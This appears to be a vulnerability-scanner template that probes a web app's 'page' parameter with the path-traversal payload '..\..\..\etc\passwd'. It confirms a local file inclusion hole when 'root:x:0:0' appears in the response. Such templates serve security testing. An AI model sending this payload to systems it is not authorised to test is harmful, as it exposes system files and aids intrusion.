id: lfi3-043
name: 'Traversal to passwd via page'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via page'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      page:
        - '..\..\..\etc\passwd'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
